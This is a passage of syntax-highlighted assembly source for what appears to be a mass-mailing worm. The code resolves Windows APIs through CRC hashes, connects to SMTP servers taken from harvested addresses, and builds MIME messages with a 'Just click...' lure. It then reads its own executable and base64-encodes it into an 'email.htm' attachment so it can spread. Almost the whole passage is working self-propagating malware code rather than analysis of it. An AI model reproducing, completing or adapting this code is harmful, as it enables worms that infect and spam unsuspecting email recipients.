        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">store_send</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkhtml_inf</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expsize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">401001h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PF_NS</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SOCK_STREAM</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">AF_INET</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">store_socket</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkhtml_inf</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expsize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">401001h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">send_email</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">240</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">                 </span><span class="sc1">;4 hours</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cSleep</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">10000h</span><span class="sc0">                          </span><span class="sc1">;message buffer</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GMEM_FIXED</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cGlobalAlloc</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;GlobalFree</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">email_block</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkhtml_inf</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expsize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">401000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompmain</span><span class="sc0">                      </span><span class="sc1">;smtp1 ("HELO ")</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mail_recip</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkhtml_inf</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expsize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">401000h</span><span class="sc0">

</span><span class="sc5">find_smtp</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'@'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">store_smtp</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"'"</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_smtp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">branch_skip</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">skip_send</span><span class="sc0">

</span><span class="sc5">store_smtp</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"ptms"</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">copy_smtp</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"'"</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">copy_smtp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ws2crcstk.wgethostbyname</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">branch_skip</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;create and initialise sockaddr_in structure</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hostent.h_addr_list</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc2">1900h</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AF_INET</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">sockaddr_in</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ws2crcstk.wconnect</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">sockaddr_in</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_crlf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">senddata</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;SMTP client engine by RT Fishel</span><span class="sc0">
</span><span class="sc1">;polymorphic headers (random comment insertion)</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompmain</span><span class="sc0">                      </span><span class="sc1">;smtp2 ("MAIL FROM:&lt;&gt;")</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">senddata</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompmain</span><span class="sc0">                      </span><span class="sc1">;smtp3 ("RCPT TO:")</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mail_recip</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">junkhtml_inf</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expsize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">401000h</span><span class="sc0">

</span><span class="sc5">copy_recip</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"'"</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">copy_recip</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_crlf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">senddata</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompmain</span><span class="sc0">                      </span><span class="sc1">;smtp4 ("DATA")</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">senddata</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompmain</span><span class="sc0">                      </span><span class="sc1">;header1 ("From: ")</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randword</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompmain</span><span class="sc0">                      </span><span class="sc1">;header2 ("Subject: ...")</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompmime</span><span class="sc0">                      </span><span class="sc1">;header31 ("MIME-Version:")</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decomptype</span><span class="sc0">                      </span><span class="sc1">;part11 ("Content-Type:")</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompcomcr</span><span class="sc0">                     </span><span class="sc1">;part12 ("multipart/mixed;")</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompcomnt</span><span class="sc0">                     </span><span class="sc1">;part13 (" boundary=")</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randword</span><span class="sc0">                        </span><span class="sc1">;boundary</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_crlf</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;boundary pointer</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;boundary length</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randlines</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">bound_copy</span><span class="sc0">                      </span><span class="sc1">;boundary</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0a0dh</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'--'</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;end of message ;)</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">bound_copy</span><span class="sc0">                      </span><span class="sc1">;--boundary</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompmain</span><span class="sc0">                      </span><span class="sc1">;body1 ("Just click...")</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc12">'--'</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0a0dh</span><span class="sc0">
        </span><span class="sc6">stos</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">bound_copy</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decomptype</span><span class="sc0">                      </span><span class="sc1">;content-type</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompcomcr</span><span class="sc0">                     </span><span class="sc1">;part21 ("text/plain;")</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompcomnt</span><span class="sc0">                     </span><span class="sc1">;part22 (" name=email.htm")</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompcmap</span><span class="sc0">                      </span><span class="sc1">;part23 ("Content-Transfer-Encoding:")</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompcomnt</span><span class="sc0">                     </span><span class="sc1">;part24 ("quoted-printable")</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompcmap</span><span class="sc0">                      </span><span class="sc1">;part25 ("Content-Disposition:")</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">part26</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">part25</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompcomcr</span><span class="sc0">                     </span><span class="sc1">;part26 ("attachment")</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompmime</span><span class="sc0">                      </span><span class="sc1">;header31 ("MIME-Version:")</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompcmap</span><span class="sc0">                      </span><span class="sc1">;part27 ("Content-Location:")</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">patch_encode</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'RTF!'</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompcmap</span><span class="sc0">                      </span><span class="sc1">;content-encoding</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">decompcomcr</span><span class="sc0">                     </span><span class="sc1">;part28 ("base64")</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_crlf</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">                             </span><span class="sc1">;CreateFileA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">                             </span><span class="sc1">;CreateFileA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">                   </span><span class="sc1">;CreateFileA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">                             </span><span class="sc1">;CreateFileA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">                 </span><span class="sc1">;CreateFileA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0">                    </span><span class="sc1">;CreateFileA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">;CreateFileA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">7fh</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kGetModuleFileNameA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.klstrlenW</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_krnapi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kCreateFileA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.klstrlenW</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_krnapi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kGetFileSize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.klstrlenW</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_krnapi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GMEM_ZEROINIT</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cGlobalAlloc</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;GlobalFree</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;CloseHandle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">krncrcstk.kReadFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">krncrcstk.klstrlenW</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">store_krnapi</span><span class="sc0">
